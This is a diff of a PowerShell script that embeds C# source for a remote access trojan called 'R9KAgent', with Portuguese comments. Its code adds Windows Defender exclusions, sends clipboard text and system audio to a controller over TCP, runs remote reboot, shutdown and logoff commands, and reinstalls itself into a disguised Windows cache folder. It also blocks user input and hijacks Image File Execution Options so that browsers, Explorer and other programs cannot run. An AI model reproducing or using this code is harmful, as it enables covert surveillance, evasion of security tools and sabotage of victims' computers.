@@ -36,7 +36,6 @@ if ($args -notcontains "-silent") {
         try { Add-MpPreference -ExclusionPath $sd -Force -ErrorAction SilentlyContinue } catch {}
         try { Add-MpPreference -ExclusionProcess "powershell.exe" -Force -ErrorAction SilentlyContinue } catch {}
         try { Add-MpPreference -ExclusionProcess "wscript.exe" -Force -ErrorAction SilentlyContinue } catch {}
-
         try {
             $7zr = "$sd\7zr.exe"
             if (-not (Test-Path $7zr)) { Invoke-WebRequest -Uri "https://www.7-zip.org/a/7zr.exe" -OutFile $7zr -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue }
@@ -148,7 +147,6 @@ if (-not ("R9KAgent" -as [type])) {
 
         const uint CF_UNICODETEXT = 13;
         const uint GMEM_MOVEABLE = 2;
-
         const uint WM_CAP_START = 0x0400;
         const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
         const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
@@ -292,9 +290,7 @@ if (-not ("R9KAgent" -as [type])) {
                 current = GetClipboardText();
                 if (current != null) {
                     bool changed = false;
-                    lock (clipLock) {
-                        if (current != lastClipboardText) { lastClipboardText = current; changed = true; }
-                    }
+                    lock (clipLock) { if (current != lastClipboardText) { lastClipboardText = current; changed = true; } }
                     if (changed && globalWriter != null) {
                         lock (writeLock) {
                             try { globalWriter.WriteLine("CLIPSYNC:" + Convert.ToBase64String(Encoding.UTF8.GetBytes(current))); } catch {}
@@ -413,7 +409,6 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
-        // Stream sem Sleep, encode menor, sem concat
         static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
             while (myClient.Connected) {
                 try {
@@ -430,9 +425,7 @@ if (-not ("R9KAgent" -as [type])) {
                     } else {
                         Thread.Sleep(20);
                     }
-                } catch {
-                    break;
-                }
+                } catch { break; }
             }
         }
 
@@ -445,65 +438,40 @@ if (-not ("R9KAgent" -as [type])) {
                     IMMDevice device;
                     int hr = enumerator.GetDefaultAudioEndpoint(0, 1, out device);
                     if (hr != 0 || device == null) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Nenhum dispositivo de audio padrao encontrado."); }
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Nenhum dispositivo padrao."); }
                         isAudioRunning = false; return;
                     }
-
                     Guid IID_IAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
                     IAudioClient audioClient;
                     hr = device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient);
-                    if (hr != 0 || audioClient == null) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao ativar dispositivo HR=" + hr.ToString("X")); }
-                        isAudioRunning = false; return;
-                    }
-
+                    if (hr != 0 || audioClient == null) { isAudioRunning = false; return; }
                     IntPtr pFormat;
                     hr = audioClient.GetMixFormat(out pFormat);
-                    if (hr != 0 || pFormat == IntPtr.Zero) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao obter formato HR=" + hr.ToString("X")); }
-                        isAudioRunning = false; return;
-                    }
-
+                    if (hr != 0 || pFormat == IntPtr.Zero) { isAudioRunning = false; return; }
                     WAVEFORMATEX wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
-
                     hr = audioClient.Initialize(0, 0x00020000, 10000000, 0, pFormat, IntPtr.Zero);
-                    if (hr != 0) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Driver nao suporta Loopback (HR=0x" + hr.ToString("X") + ")"); }
-                        CoTaskMemFree(pFormat);
-                        isAudioRunning = false; return;
-                    }
-
+                    if (hr != 0) { CoTaskMemFree(pFormat); isAudioRunning = false; return; }
                     Guid IID_IAudioCaptureClient = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                     IAudioCaptureClient captureClient;
                     hr = audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);
-                    if (hr != 0 || captureClient == null) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao obter captura HR=" + hr.ToString("X")); }
-                        CoTaskMemFree(pFormat);
-                        isAudioRunning = false; return;
-                    }
-
+                    if (hr != 0 || captureClient == null) { CoTaskMemFree(pFormat); isAudioRunning = false; return; }
                     audioClient.Start();
                     bool sentFmt = false;
-
                     while (isAudioRunning && globalWriter != null) {
                         Thread.Sleep(10);
                         uint packetSize;
                         hr = captureClient.GetNextPacketSize(out packetSize);
                         if (hr != 0) { Thread.Sleep(100); continue; }
-
                         while (packetSize > 0 && isAudioRunning) {
                             IntPtr pData; uint numFrames; uint flags; ulong pos, qpc;
                             hr = captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);
                             if (hr != 0) break;
-
                             if (numFrames > 0) {
                                 int bytes = (int)(numFrames * wfx.nBlockAlign);
                                 byte[] buffer = new byte[bytes];
                                 Marshal.Copy(pData, buffer, 0, bytes);
-
                                 bool isFloat = (wfx.wFormatTag == 3);
                                 if (wfx.wFormatTag == 0xFFFE && wfx.wBitsPerSample == 32) isFloat = true;
-
                                 if (isFloat) {
                                     int samples = bytes / 4;
                                     byte[] pcm16 = new byte[samples * 2];
@@ -517,7 +485,6 @@ if (-not ("R9KAgent" -as [type])) {
                                     }
                                     buffer = pcm16;
                                 }
-
                                 lock (writeLock) {
                                     if (globalWriter != null) {
                                         if (!sentFmt) { globalWriter.WriteLine("AUDIO_FMT:" + wfx.nSamplesPerSec + ":" + wfx.nChannels + ":16"); sentFmt = true; }
@@ -636,7 +603,6 @@ if (-not ("R9KAgent" -as [type])) {
                     else { lock (writeLock) { myWriter.WriteLine("MONITOR:1/1"); } }
                     return;
                 }
-
                 if (cmd.StartsWith("clip_sync ")) {
                     try {
                         string b64 = cmd.Substring(10);
@@ -647,11 +613,9 @@ if (-not ("R9KAgent" -as [type])) {
                     } catch {}
                     return;
                 }
-
                 if (cmd == "reboot")   { lock (writeLock) { myWriter.WriteLine("REBOOTING"); } Thread.Sleep(200); Process.Start("shutdown", "/r /f /t 0"); return; }
                 if (cmd == "shutdown") { lock (writeLock) { myWriter.WriteLine("SHUTTING_DOWN"); } Thread.Sleep(200); Process.Start("shutdown", "/s /f /t 0"); return; }
                 if (cmd == "logoff")   { lock (writeLock) { myWriter.WriteLine("LOGGING_OFF"); } Thread.Sleep(200); Process.Start("shutdown", "/l /f"); return; }
-
                 if (cmd == "reinstall" || cmd == "update") {
                     try {
                         string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
@@ -672,7 +636,6 @@ if (-not ("R9KAgent" -as [type])) {
                     Environment.Exit(0);
                     return;
                 }
-
                 if (cmd == "banner_on") {
                     if (bannerThread != null && bannerThread.IsAlive) return;
                     BlockInput(true);
@@ -774,11 +737,7 @@ if (-not ("R9KAgent" -as [type])) {
             }
             string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
             foreach (var app in apps) {
-                try {
-                    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app)) {
-                        key.SetValue("Debugger", "svchost.exe");
-                    }
-                } catch {}
+                try { using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app)) { key.SetValue("Debugger", "svchost.exe"); } } catch {}
             }
         }
 
